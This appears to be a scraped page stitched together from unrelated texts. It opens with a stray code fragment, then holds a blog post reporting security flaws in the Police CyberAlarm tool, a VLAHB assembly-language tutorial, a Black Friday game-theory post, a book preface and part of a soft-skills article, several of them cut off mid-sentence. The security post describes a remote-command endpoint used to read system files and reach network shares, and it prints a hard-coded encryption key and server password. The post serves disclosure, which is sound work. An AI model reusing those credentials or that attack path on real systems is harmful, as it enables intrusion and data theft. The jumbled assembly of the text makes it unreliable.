 &nbsp; &nbsp; &nbsp; }
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'line'

<article id="5fbcefde44b88204da4fb1cc">


<figure><img src="https://paul.reviews/content/images/2020/11/cyber-alarm-1.png"></figure><p>Phew! It's been 3 long years since my last article... and I've deliberated over posting this for way too long. &nbsp;But, I feel it's important enough to warrant at least some debate.</p><p>2 months ago, I came across a tweet by Lancashire Police Fraud &amp; Cyber advertising CyberAlarm; a govt-funded tool to help protect companies from cyber attacks.</p><figure><blockquote><div lang="en" dir="ltr"><p>Police CyberAlarm helps small businesses, charities, academia and local authorities get upp-to-date knowledge of cyber attack types and trends which is an absolute key to having a robust defence. </p><p>Businesses can sign up for memeberships at <a href="https://t.co/JTFlQg7yMV">https://t.co/JTFlQg7yMV</a> 🖥️ <a href="https://t.co/bq88tsZYsa">pic.twitter.com/bq88tsZYsa</a></p></div>— Lancs Police Fraud &amp; Cyber (@LancsFraudCyber) <a href="https://twitter.com/LancsFraudCyber/status/1310535084324327425?ref_src=twsrc%5Etfw">September 28, 2020</a></blockquote>

</figure><p>Interest piqued, I signed up and awaited my "access code" which is necessary to gain access to the downloads page. Or so I thought.</p><p>A few days later, I was contacted by a Cyber Protect officer from Leicestershire Police who explained there was no download link for the "live" product on the grounds of "data confidentiality". &nbsp;I'm not sure I understand that premise, given it's a product intended for public use... but I digress. &nbsp;Instead, he provided an "installation guide" PDF which outlined how the product worked &amp; how to install it. &nbsp;If I still wanted to proceed, he could provide the access code.</p><p>Here's a segment of the installation guide...</p><figure><img src="https://paul.reviews/content/images/2020/11/1.PNG"></figure><p>--</p><p>Their installation guide suggests running it inside a DMZ (de-militarized zone, an isolated segment from other network assets) or "<strong>on your internal network</strong>".</p><p>For many firms, especially SME, the concept of running a DMZ is alien; with many network assets all joined together with no logical/physical segmentation whatsoever. &nbsp;This is crucial, as isolating potentially dangerous assets (IoT, BYOD devices etc) from your core infrastructure is vital to help prevent attacks travelling across your network.</p><p>Unfortunately, it's likely to be those smaller SMEs without a DMZ who deploy CyberAlarm; in the mistaken belief it's a safe &amp; secure way to mitigate cyber threats.</p><p>If you're going to run <em>anything </em>on your internal network, you must be able to ensure the product is reasonably secure. &nbsp;Faith-based security rarely ends well, so let's dive in.</p><h2 id="installation-">Installation:</h2><p>In the installation guide, they advise you to deploy this on a dedicated machine... which seems reasonable, until they explain why...</p><figure><img src="https://paul.reviews/content/images/2020/11/2.PNG"></figure><p>Disable SELinux?!</p><p>SELinux or "Security-Enhanced Linux" is a mandatory access control (MAC), a vital security tool built into CentOS (based on RedHat Linux). &nbsp;It's designed to protect system administrators from themselves; enforcing strict security policies and ensuring isolation between processes. &nbsp;If it's disabled, poorly-configured or malicious apps/services have root access (aka - total control) over the device.</p><p>NCSC quite rightly state "rooted/jailbroken devices are a threat to sensitive data" (<a href="https://www.ncsc.gov.uk/guidance/application-development-guidance-introduction">https://www.ncsc.gov.uk/guidance/application-development-guidance-introduction</a>), but NPCC are actively pushing a product which requires you to effectively root your device!</p><p>If you take NCSC's advice (and you really should!), this alone is a deal-breaker. &nbsp;The <em>only</em> reason you'd disable a vital security control is because you're too idle/inept to overcome the issue which prompted you to disable it in the first place. &nbsp;If you need further proof of this ridiculous decision, here's an article on the CentOS blog called <a href="https://blog.centos.org/2017/07/dont-turn-off-selinux/">No! Don't turn off SELinux!</a> in which Thomas Cameron, Chief Architect for Red Hat says "Linux is a gun and you know where your foot is".</p><p>Anyway...</p><p>I noticed a screenshot with the download link and without an access code or authentication, I proceeded to download the 2GB virtual machine image and launched it with VMWare Workstation.</p><h3 id="opening-pandora-s-box-">Opening Pandora's box...</h3><p>There's a lot to get through, so I'll summarise as much as possible.</p><h3 id="php-5-4">PHP 5.4</h3><figure><img src="https://paul.reviews/content/images/2020/11/5.png"></figure><p>PHP 5.4 was end of life in September 2015. &nbsp;No more security patches or updates, it's dead and should never be used in a production app. &nbsp;I'll also mention, I put this "phpinfo" file here remotely; it's not part of CyberAlarm.</p><h3 id="remote-network-access-via-rce">Remote Network Access via RCE</h3><p>This one beggars belief. &nbsp;The app has a file called "getmon.php" which literally serves as an RCE (remote command execution) endpoint.</p><figure><img src="https://paul.reviews/content/images/2020/11/4.png"></figure><p>The above image shows me grabbing /etc/passwd from the virtual machine.</p><p>That's bad enough, but what if the attacker is slightly more creative?</p><p>Here, we use the SMB protocol to <strong>connect to another PC inside the network</strong> and grab sensitive data from it.</p><figure><img src="https://paul.reviews/content/images/2020/11/3.png"></figure><p>If you have sensitive data, trade secrets or anything else important on your network, it's now remotely accessible to <em>anyone, anywhere </em>when you view a web page. &nbsp;We haven't placed anything on the network/virtual machine to achieve this either... the attacker is just carrying out commands as if they're sat inside your network.</p><p>Let me be really clear about this. &nbsp;This vulnerability allows a remote attacker to entirely bypass your firewall and exfiltrate <em>any </em>data accessible over your network; you only need to visit a vulnerable web page once.</p><h3 id="cross-site-scripting">Cross Site Scripting</h3><p>Looking through the code, there's no attempt to sanitize (or make safe) any user inputs, so an attacker can remotely inject malicious code into any page on the box. &nbsp;Here, we hijack the "registration" page.</p><figure><img src="https://paul.reviews/content/images/2020/11/6.png"></figure><h3 id="tls-certificate-expiry">TLS certificate expiry</h3><p>It should go without saying, but if your security certificate expires, it's no longer secure.</p><figure><img src="https://paul.reviews/content/images/2020/11/7.png"></figure><h3 id="broken-encryption">Broken Encryption</h3><p>The strongest of door locks is rendered insecure if you leave the key somewhere vulnerable. &nbsp;The same applies in cryptography. &nbsp;It's absolutely vital to generate a cryptographically random key and handle it securely.</p><p>Sadly, CyberAlarm does neither.</p><p>The "key" is static and hard-coded: "P3rv4d3S0ftw4r3"</p><p>Reading between the character substitution, you'll see "Pervade Software" - the developers behind CyberAlarm.</p><p>To make matters worse, they use AES-CBC, which can be implemented securely by a competent developer. &nbsp;Alas here, the weak key and complete lack of MAC (message authentication code) means they cannot trust <em>any </em>of the data they collect.</p><p>A MAC is vital; it allows the recipient to ensure the data hasn't been manipulated during transit. &nbsp;Without it, they're actioning harvested data collected from "data collectors" with <strong>absolutely no guarantee</strong> of its integrity. &nbsp;Far from improving security, I'd argue this makes matters worse. &nbsp;Your reports could be entirely fake or largely contain data you can't act upon; diverting your attention from real risks.</p><h3 id="broken-encryption-part-deux">Broken Encryption &nbsp;- Part Deux</h3><p>One sure-fire way to ensure your product is entirely insecure is to disable all security checks on your certificate, which of course, CyberAlarm does.</p><figure><img src="https://paul.reviews/content/images/2020/11/8.PNG"></figure><p>This means all updates are insecure - allowing an attacker to put <em>anything </em>on the device remotely. &nbsp;Note: I've added the comments in this screenshot to clarify what each line does.</p><h3 id="embedding-server-passwords-in-code-">Embedding server passwords in code!</h3><p>Seriously.</p><p>When the app needs to grab a list of "jobs" or tasks to carry out locally, it logs in with a password of "3jscove".</p><figure><img src="https://paul.reviews/content/images/2020/11/image.png"></figure><p>If you're wondering, the "phash" function is a wrapper for SHA-256; another insecure &amp; unsuitable choice for password hashing.</p><h2 id="insert-record-scratch-sound-here">&lt;insert record scratch sound here&gt;</h2><p>In light of all these failings, I notified Leicestershire Police and awaited their response.</p><p>When it came, I was stunned.</p><p>The link I'd "found" (from their installation guide) was a 2yr old "test" version never intended for public use! &nbsp;Great, it's 2 years old... now your dependencies are only 3 years out of date instead &lt;/sarcasm&gt;</p><p>I'm not about to disclose the entire conversation or the meetings which followed, but when the phrase "no deal breakers" was uttered, I realised this has to go public. &nbsp;In fairness, they have put me in touch with the CTO at Pervade with a view to "making the product better" but after a couple of brief conversations (none of which technical) and despite his candid response, my position now hasn't changed from day one.</p><p>This pilot should be pulled <strong>immediately</strong>. I'd actually go one step further and question how a product with so many simple but critical security flaws could ever be promoted by the Police.</p><h2 id="the-actual-live-version-">The "actual" live version...</h2><p>Following my criticisms over the "old" version, I was given an access code to allow me to download the "live" one.</p><p>Suffice to say, little has changed.</p><p>The code is still woefully insecure, as is the implementation of several core features and in all honesty, I just haven't the time nor motivation to explain why disabling security controls is a bad idea. Sorry Jon.</p><h2 id="obscurity-hides-a-thousand-sins-">Obscurity hides a thousand sins...</h2><p>What I haven't yet mentioned, is the fact that every single line of code in CyberAlarm is encoded/obfuscated using IonCube. &nbsp;By obscuring the code, it prevents any casual observer from uncovering the mess contained within.</p><figure><img src="https://paul.reviews/content/images/2020/11/10.PNG"></figure><p>Thankfully, IonCube is easily reversed (as is any encoding) and offers very little real-world protection. &nbsp;However, CyberAlarm has apparently "passed" a penetration test which, assuming it wasn't carried out by Stevie Wonder, beggars belief.</p><h2 id="summary">Summary</h2><p>CyberAlarm is sadly nothing more than an insecure, poor-designed/engineered wrapper around OpenVAS - an open-source vulnerability assessment scanner.</p><p>I appreciate the forces may disagree with my findings and/or conclusions, however whilst they don't consider any of the above to be "deal breakers", the public are now able to decide if they're willing to entrust their firms security to a product like CyberAlarm.</p><p>If you're in #infosec (even if you're not), I welcome your comments below.</p><h3 id="update-s-">Update(s)</h3><p>25/11/20 3PM: Thanks to Dave Walker on Twitter for pointing out a mistake regarding CentOS. &nbsp;My screenshots show a later build with CentOS 7 / PHP 5.4 so to avoid confusion, I've removed that section. Apologies folks.</p><p>27/11/20 17:30PM: The NPCC have <a href="https://cyberalarm.police.uk/pca-official-response/">published a response</a>, claiming this is "completely untrue". &nbsp;Needless to say, they're entirely wrong... but I've been hearing that story for 2 months. &nbsp;I'll reply here shortly, however for more immediate updates, keep your eyes peeled on <a href="https://twitter.com/paul_reviews">@paul_reviews</a> - where I've already disproven their first claim (they never provided a link to the …</p></article></div></div>

    <h2>Scope of Blog</h2>

    <p>To provide a very simple overview of the assembly programming language in <a href="https://github.com/Kully/VLAHB">VLAHB</a> and assembly programming principles in general. Machine code and opcodes is beyond the scope of this blog post.</p>

    <h2>The Brains of the Operation</h2>

    <p>A <b>virtual machine</b> ("vm") acts like a real computer but it only exists within software and not hardware. This means that a virtual machine is not made of physical pieces of etched silicon, printed circuit boards, transistors or capacitors or anything like that. Instead it is "virtual" which means that we program this computer ourselves to do what want: to read and execute binary files according to a blueprint we give it.</p>

    <p>Checkout the file called <a href="https://github.com/Kully/VLAHB/blob/master/vm.c#L142-L571">vm.c</a> in <b>VLAHB</b>. See the <b>switch</b> statement and all the <b>case</b> lines? This is code that tells the virtual machine that if it sees an instruction <b>0x0001</b>, do <b>X</b>. If it sees <b>0x0002</b>, do <b>Y</b>, and so on and so forth.</p>


    <h2>Assembly to Binary</h2>

    <p><b>VLAHB</b> is a vm together with an assembly language - let's call it <b>VASM</b> - and an assembler (<i>assembler.py</i>) which converts assembly files (<i>file.asm</i>) to raw machine code (<i>file.bin</i>) that our vm can read and execute.</p>

    <p><img src="http://adamkulidjian.com/imgs/asm_hex_bin_thinarrow.png"></p><p>The process of turning file.asm to file.bin is called <b>assembling</b>.</p>

    <p>Our vm features a special integer called a <b>program counter</b> ("pc") which keeps track of what line the vm is reading at a time. When you tell the vm to run the program <i>myFile.bin</i>, the <b>pc</b> value is assigned to the line number of the program that the vm will begin "reading" (think Turing Machine). The pc is set to this value and then...</p>

    <ul>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        ... and so on
    </ul>
    <p>Nothing is inherently special about these cryptic codes. <b>1002 0003 0000 fde8</b> has no inherent meaning but the vm reads and knows to load the literal 65000 into ram at index 4098.</p>

    <h2>RAM</h2>

    <p>There is a list called <b>ram</b> stored in our virtual machine <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a>. It contains 65535 0's. Each slot of ram holds an integer from 0 to 4294967295. By changing the values in our ram slots we can get super mario to run across the screen, create a paint application, or solve world peace.</p>

    <pre><code>// Empty brackets <b>[ ]</b> represent <b>0</b>
ram := [ ][ ][ ][ ][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 </code></pre>

    

    <p><b>Ram Slot Dedication:</b> this represents how our ram slot are organized

    </p><pre><code>[-----------] [-------] [--] [---------] [---------------------------]
0       4095  4096 4099 4100 4101  27140 27141                   65535 
</code></pre>

    <table>
        <tbody><tr>
            <th>slots in ram</th>
            <th>what they do</th>
        </tr>
        <tr>
            <td>0-4095</td>
            <td>function inputs</td>
        </tr>
        <tr>
            <td>4096-4099</td>
            <td>4 pointers (U,V,Y,Z resp.)</td>
        </tr>
        <tr>
            <td>4100</td>
            <td>return slot for function outputs</td>
        </tr>
        <tr>
            <td>4101-27140</td>
            <td>vram</td>
        </tr>
        <tr>
            <td>27141-65535</td>
            <td>free space</td>
        </tr>
    </tbody></table>

    <h2>Simple Operations</h2>

    <p>The simplest operation to perform on ram is a direct load. This loads a value into a slot of ram.</p>

    <p>
    <b> Ex. 1 </b></p><pre><code>LD R[3] 2  // load 2 into the slot of ram at index 3
</code></pre>

    <pre><code>
ram := [ ][ ][ ][2][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
    </code></pre>

    <p>There are other ways to manipulate ram. <b>VASM</b> handles all the basic operations <b>+</b>, <b>-</b>, <b>×</b>, <b>÷</b></p>

    <p>
    <b>Ex. 2</b></p><pre><code>ADD R[1] 8     // ram[1] = ram[1] + 8
SUB R[2] R[1]  // ram[2] = ram[2]-ram[1]
MUL R[2] 5     // ram[2] = ram[2] * 5</code></pre>

    <hr>

    <p><b>Exercise 1</b> What happens to ram after compiling this assembly code and running it in vm?
    <br><i>(assume <b>ram</b> is initialized as an array of 0s)</i></p><pre><code>LD R[2] 2
MUL R[2] 2
LD R[69] 3
MUL R[2] R[3]
EXIT</code></pre>


    <h2>Labels</h2>

    <p>Our assembly language supports a primitive to functions called <b>LABELS</b>. When assembly code is compiled down to machine instructions for the virtual machine, labels don't appear in the code. Instead they are treated as markers in the code where you can loop to, jump to, etc. Therefore it is better to write <b>GOTO MY_FIRST_LABEL</b> rather than something like <b>GOTO 1729</b>.</p>

    <pre><code>MATH_ADD_TWO_NUMBERS:
LD R[4100] R[0]
ADD R[4100] R[1]  // store the sum of R[0] and R[1] into R[4100]
RETURN
</code></pre>

    <p><i>Q. Why are we storing stuff in <b>R[4100]</b>?</i></p><p>

    <i>A. Our function output is by convention stored at <b>R[4100]</b>. We could have picked <b>R[1729]</b>.</i></p><p>To jump the pc to a label, call it with the <b>CALL</b> opcode. This pushes the current pc to the <b>stack</b> - a stack in the CPU - and the pc is set to the line where the label is</p>

    <p><b>RETURN</b>: this <b>pops</b> the pc from the stack and sets the pc to that popped value. If we write something like the code snippet below then ram will not be touched.</p>



    <pre><code>CALL WHAT_IS_LIFE
EXIT

// we never go here
LD R[0] 55
LD R[1] 51
LD R[2] 44

WHAT_IS_LIFE:
    RETURN
</code></pre>


    <p><i>But why?</i> Once we hit <b>CALL WHAT_IS_LIFE</b>, the pc will be pushed, and the pc jumps to <b>WHAT_IS_LIFE</b>. The stack and pc now looks like this:</p>

    <pre>    stack = [0]
    pc = 0
    </pre>

    <p>In the next line we hit a <b>RETURN</b>, which means we <b>pop</b> from the stack and assign our pc to that value.</p>

    <pre>    stack = [ ]
    pc = 0
    </pre>

    <p>Now we advance a line to the second line of our program and hit <b>EXIT</b>. The vm exits.</p>
    
    <hr>

    <p><b>Exercise 2</b> Describe in your own words what the program below is doing to ram.

    </p><pre><code>LD R[0] 3
LD R[1] 4
CALL DO_SOMETHING
EXIT

DO_SOMETHING:
    LD R[4100] R[0]
    ADD R[4100] R[1]
    RETURN
</code></pre>


    <h2>Pointers</h2>

    <p>Let's say you want to be able to programmatically place values in ram with assembly. Let's say for instance you want to put 7 in R[3], 7 in R[6], and 7 in R[9].</p>

    <p>Notice that our index of ram is a multiple of 3 each time: 3, 6, 9. We can write</p>

    <pre><code>LD R[3] 7
LD R[6] 7
LD R[9] 7
</code></pre><p>

    but with a pointer:

    </p><pre><code>LD R[4096] 3  // pointer U
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 6
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 9
LD R[U] 7
</code></pre>


    <p><i>How does this work?</i></p><p>
        A <b>pointer</b> refers to a slot of ram that the vm treats in a _special_ way. The word _special_ refers to vm interpreting that value as an index of ram. <b>VLAHB</b> has 4 hard-coded slots for pointers, located at ram slots <b>R[4096]</b>, <b>R[4097]</b>, <b>R[4098]</b> and <b>R[4099]</b>, with the designated letters <b>U</b>, <b>V</b>, <b>Y</b>, <b>Z</b> respectively.
    </p>

    <table>
        <tbody><tr>
            <th>letter</th>
            <th>ram slot</th>
        </tr>
        <tr>
            <td>U</td>
            <td>R[4096]</td>
        </tr>
        <tr>
            <td>V</td>
            <td>R[4097]</td>
        </tr>
        <tr>
            <td>Y</td>
            <td>R[4098]</td>
        </tr>
        <tr>
            <td>Z</td>
            <td>R[4099]</td>
        </tr>
    </tbody></table>

    <br>

    <div><p>
        Look at the first two lines of asm code above. We first load 3 into 4096. The second line is <b>LD R[U] 7</b>. This tells the program to load a 7 into the ram[ram[4096]]. </p><p> Since ram[4096] = 3, we are loading 7 into ram[3].
    </p></div>

    <pre><code>ram := [0][0][0][7][0][0][0][0]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
</code></pre>

    <p><b>NB</b> There are more opcodes built into <b>VLAHB</b> that use pointers. Checkout <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a> to see them all.

    </p><hr>

    <p><b>Exercise 3</b> The code snippet below loads the integer <b>7</b> into slots 120 to 130 inclusive. Rewrite the code below using the opcode <b>LD R[U] R[V]</b>.

    </p><pre><code>LD R[120] 7
LD R[121] 7
LD R[122] 7
LD R[123] 7
LD R[124] 7
LD R[125] 7
LD R[126] 7
LD R[127] 7
LD R[128] 7
LD R[129] 7
LD R[130] 7
</code></pre>


    <h2>Conditional Opcodes</h2>

    <p>A subset of opcodes are called <b>conditional</b> and can result in the pc skipping the next line of assembly code (that's +2 lines in machine code since each valid assembly line maps to exactly 2 lines of machine code after it's compiled). These opcodes compare one value with another. These opcodes are called conditional because they may jump over an extra line of assembly depending on some condition.</p>

    <p>For example <b>CMP R[0] 2</b> checks if ram[0] is equal to 2. If it is, skip next line. Else, do nothing. Read the example below carefully</p>

    <pre><code>LD R[0] 4
LD R[1] 0

CMP R[0] 8  // if R[0] == 8, skip next line
LD R[1] 1
EXIT  // R[1]=1 at end of program
</code></pre>

    <table>
        <tbody><tr>
            <th>opcode</th>
            <th>meaning</th>
        </tr>
        <tr>
            <td>CMP</td>
            <td>is equal to</td>
        </tr>
        <tr>
            <td>LT</td>
            <td>less than, &lt;</td>
        </tr>
        <tr>
            <td>LTE</td>
            <td>less than or equal, &lt;=</td>
        </tr>
        <tr>
            <td>GT</td>
            <td>greater than, &gt;</td>
        </tr>
        <tr>
            <td>GTE</td>
            <td>greater than or equal, &gt;=</td>
        </tr>
    </tbody></table>

    <hr>

    <p><b>Exercise 4</b> What is loaded into slot <b>R[33]</b> when the program hits <b>EXIT</b>?</p>

    <pre><code>LD R[0] 3
LD R[33] 0

CMP R[0] 2
ADD R[33] 1
GTE R[0] 2
ADD R[33] 1
ADD R[33] 2

EXIT
</code></pre>

    <h2>VRAM</h2>

    <p>A subset of our ram slots are dedcated to pixels for the 160X144 px display. This happens to be the same resolution of the original Game Boy. The choice of vram slots is arbitrary so we'll pick slots from ram[4101] to ram[27140] inclusive. These slots map onto the screen from top to bottom, left to right, starting with the top-left pixel.</p>

    <p>An int stored in vram is interpreted as an rgba color. It is easier to load a hexidecmial integer as it's easier to read what color you are loading.</p>

    <p><b> Ex. 1 </b> red pixel in top left corner</p>

    <pre><code>// let's place a red pixel at the top-left corner

LD R[4101] 0XFF0000FF // rgba(255,0,0,255)
BLIT  // this draws the screen

INFINITE_LOOP:
    INPUT R[0]
    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP  // loop forever so we can see the red dot
</code></pre>

    <p><img src="http://adamkulidjian.com/imgs/vram_1px.png"></p><p><b> Ex. 2 </b> red, green, blue pixels in top left corner</p>

    <pre><code>LD R[4101] 0XFF0000FF // red
LD R[4102] 0X00FF00FF // green
LD R[4103] 0X0000FFFF // blue
BLIT

INFINITE_LOOP_2:
    INPUT R[0]
    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP_2  // loop forever

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Black Friday and associated late November sales are collectively a neutron star warping the gravitational field of the annual consumer spending cycle. The story of <a href="https://en.wikipedia.org/wiki/Black_Friday_(shopping)">how Black Friday came to be</a> is fairly simple: a focal point for sales gaining momentum year after year. While Black Friday started with American big box retailers offering discounts to consumers shopping primarily for Christmas gifts, it has turned into a cultural event in itself and has, in recent years, even come to the creator&nbsp;economy.</p>
<p>Depending on your model, this can be a good or a bad thing. Sure, now-defunct department stores offering discounts on televisions a decade ago shouldn’t be the basis for deciding how to price my information products. But, everyone choosing to run a discount at the same time of year is a great reason for me to choose to discount my own products. So, let’s talk about the Obligatory Late November Sale (<span>OLNS</span>).</p>
<p>I’ve worked retail on holidays; I have reason to dislike Black Friday. But, I’ve also walked through midwestern malls with friends from Russia, Iran, and Germany, all staying over for Thanksgiving, spectating and indulging in the excesses of the America they have seen on <span>TV</span>. Rather than trying to develop moral arguments for and against Black Friday as a whole, I’m tackling the much easier task of developing one game theoretic model for and one against the <span>OLNS</span> specifically applied to the online creator&nbsp;economy.</p>
<p>If you have no background in Game Theory, spend a few minutes <a href="https://www.investopedia.com/terms/g/gametheory.asp">here</a> or just look up terms that are unfamiliar as you&nbsp;go.</p>
<p>All models are wrong, some are useful. The usefulness of a model starts with the underlying assumptions. There are two important simplifying assumptions that I am making in the following models. The first is that offering a <span>OLNS</span> does not materially increase the creator’s reach. This assumption is based on the difficulty of standing out from the noise of everyone offering some sort of Black Friday discount. Thus, another necessary assumption is that some percent of a creator’s audience has not yet bought their&nbsp;product.</p>
<p>The second simplification is that I am playing fast and loose with the idea of a “player” in game theory. Game theorists have developed more sophisticated models than the ones presented below for modeling one player’s interactions against a prevailing norm rather than a single other player. However, by making my model more wrong (using a two-person creator economy), I can actually make it more widely useful by requiring less econ background to understand the&nbsp;model.</p>
<h3>Model 1: Prisoner’s&nbsp;Dilemma</h3>
<p>Thesis: Creators don’t want to run discounts because they lose out on&nbsp;margin.</p>
<p>If creators don’t want to run discounts, running a <span>OLNS</span> is a prisoner’s dilemma. Let’s take two creators, Alice and Bob, who each sell a similar information product in the same market. Their information products each costs 33 dollars, each Alice and Bob is considering a 1/3 discount to 22&nbsp;dollars.</p>
<p>If neither Alice nor Bob runs a discount, each will sell 10 units, the same as they sell every week. However, if Alice runs a discount, she will attract 6 more customers. Let’s say that 3 are new participants in the market and the other 3 would have bought from Bob but for the discount. The same thing happens in reverse if Bob runs a discount. However, if they both run discounts, they each attract 3 new customers, but neither steals the others’ customers. It is important to note here that I am <span>NOT</span> modeling a discount as a zero-sum game, which would be inappropriate for a large market like the creator&nbsp;economy.</p>
<p>Here is a payoff matrix of revenue for that&nbsp;situation:</p>
<p><img alt="PD Payoff Matrix" src="https://philipkiely.com/assets/img/olns_pd.png"></p>
<p>Alice and Bob both have a dominant strategy of running a discount, but both will end up with less revenue than if neither had&nbsp;discounted.</p>
<p>Astute readers may note that these numbers, which are totally fabricated, could be altered such that running a discount is a good deal for both parties. Why not conjure up more customers attracted by the&nbsp;discount?</p>
<h3>Model 2:&nbsp;Assurance</h3>
<p>Thesis: Creators want to run discounts to generate marginal&nbsp;sales.</p>
<p>Let’s slightly adjust the above model: regardless of whether Alice or Bob runs the discount alone or at the same time, if one runs a discount, they get 6 additional customers, and these are all new customers and not from each others’ customer bases. The model is a bit different now, but they have the same dominant strategy: run the sale regardless of the others’&nbsp;action.</p>
<p><img alt="A1 Payoff Matrix" src="https://philipkiely.com/assets/img/olns_a1.png"></p>
<p>However, this model doesn’t yet answer why it is strictly beneficial for creators to run discounts at the same time. Well, consumer psychology is a tricky thing. For information products, generally priced at a premium (charge more!) and targeted at professional audiences, frequent discounts can undermine the credibility of the price and product. Price uncertainty can delay purchases, after all, if the product is randomly discounted, why not wait? After running random sales, I’ve even had customers making a purchase a day before or after write to me asking to get refunded down to the sale price. People don’t like to feel like they missed&nbsp;out.</p>
<p>So, if running a sale, especially a major discount that really attracts the marginal customer, is risky, and doing it too often cuts into your margin and credibility, then you want to run such sales infrequently but predictably. Thus, the Obligatory Late November Sale actually represents a wonderful opportunity! You can run your deep discount and customers are expecting it. Many creators and larger businesses participating isolates you from most backlash, after all, it is on the customer if they didn’t see it coming or they missed it. Customers unwilling to pay full price will wait for a known date, while customers paying full price ahead of time will know that they could have waited and are choosing not&nbsp;to. </p>
<p>Let <em>R</em> be the reputation hit from having a random sale. Then, for Alice and Bob, the assurance model of the <span>OLNS</span>&nbsp;is:</p>
<p><img alt="PD Payoff Matrix" src="https://philipkiely.com/assets/img/olns_a2.png"></p>
<p>Running a sale at the same time gives both creators extra revenue without the reputation&nbsp;hit.</p>
<p>Coordinating a sale between every creator would be very difficult. Assurance models have the idea of focal points, so everyone who knows the payoffs and participants could come up with the same focal point without communicating. Black Friday is, as I stated at the beginning, a neutron star of a focal point, making it easy for creators everywhere to run a sale at the same&nbsp;time.</p>
<h3>Model 3:&nbsp;Anecdote!</h3>
<p>I started running my Obligatory Late November Sale less than 48 hours ago at the time of writing. After a tweet announcing the discounts, yesterday I made enough to fill the fridge and pantry at Trader Joe’s, today I made enough to buy some secondhand furniture for my new apartment. Fortunately, I’m not in the position of relying on this income to do those things, but even still paying for material expenses with information product money feels <em>really</em>&nbsp;good.</p>
<p><img alt="Gumroad Analytics Screenshot" src="https://philipkiely.com/assets/img/olns_ss.jpg"></p>
<p>Of course, I have to let you know that my book <a href="https://philipkiely.com/wfsd">Writing for Software Developers is 30% off</a> until the end of the month. The discount should be applied automatically, if not, use the code “olns” (obligatory late november sale). Also, <a href="https://philipkiely.com/cefip">Cold Email for Interesting People</a> is still pay-what-you-want, but pay 30% less I&nbsp;guess?</p>

November 27, 2020 | https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/ | <a href="https://web.archive.org/web/*/https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>
<div>

<p>Evolutionary Algorithms (<em>EAs</em>) are a fascinating class of algorithms for meta-heuristic optimisation. There exist many books on the topic of EAs, ranging from their theory to practice. The first book I read on the topic was <em>Genetic algorithms in search, optimization, and machine learning</em> by David E. Goldberg (1989), and to this day I still recommend it to new students in the field.</p>

</div>
</div>
</div><div>

<div>
<p>However, there is a re-occurring difficulty when my students are starting out in the field, <em>"how do I move from theory to practice?"</em>. Most books will have some chapters dedicated to applications of EAs, but what's missing is an up-to-date book dedicated to using modern technology and concepts.</p>
</div>
</div><div>

<div>
<div>
<p>When writing this book, I had to answer some difficult questions:</p>
<ul>
<li>What programming language will my examples be written in?</li>
<li>What software libraries will I use?</li>
<li>How do I structure the chapters and sections, do I lead entirely by example or do I dedicate some parts to the theory?</li>
<li>Do I focus on single-objective EAs or multi-objective EAs?</li>
</ul>
<p>Nevertheless, the decisions had to be made. I selected Python as the programming language simply due to its rise in popularity (in 2019), and this was only a difficult choice because there is a wealth of resources written for MATLAB. Of the resources written in MATLAB, it is a shame to not be able to use PlatEMO, which is a well-maintained open-source platform for Evolutionary Multi-objective Optimisation. In its place, when a software library is needed, I will turn to Platypus, which provides optimisation algorithms and analysis tools for multi-objective optimisation.</p>
<p>For the structure of the chapters and sections, I have decided to lead entirely by example. There will be code to demonstrate every concept used, and I will show how we can implement algorithms from their mathematical representation. In these cases, I will focus on the readability of the implementations rather than their performance.</p>
<p>Finally, I will focus on multi-objective EAs as this represents the majority of real-world problems. However, single-objective EAs will make an appearance to highlight the differences between the two.</p>

<div>
<p>Perhaps the most difficult question to answer is <em>where do we start?</em> There is so much to cover, and many potential starting points. For this book, I will start with a definition of objective functions, and illustrate the relationship between what we call the problem space and the objective space. With this approach, I hope there will be a clear understanding of what the various operators within an EA are affecting.</p>

This is post 2 of 2 in the series <em>“Essential skills for software engineers”</em> </p>
<p>Raw coding skills are only a fraction of what your future dream company is looking for. There are also the so-called “soft skills” – I personally don’t like this term – let’s simply call them skills, too. Both are crucial to your job. I’ll walk you through each skill area, reason about its importance, and then show you the usual expectations depending on your level.</p>
</label></p>
</div>
<p>Sounds fuzzy and a bit bulls*itty, right? Well, it turns out that if your teammates are pricks, you tend to quit or stay and be unhappy and demotivated. This is not fluff; studies and surveys confirm this. We spend a lot of time in our work communities, and it’s vital to be surrounded by people who care, with whom we feel comfortable.</p>
<p>This does not depend on software engineering levels – it’s a universal trait. It’s also technically not a skill, yet there’s a surprising amount of practice involved in getting better at showing kindness. This is not just about having a positive attitude by default – but being genuinely kind to others.</p>
<h2>Why is kindness important?</h2>
<p>Besides leaders’ responsibility to create humane, caring environments for their teams there are well-understood business reasons, too:</p>
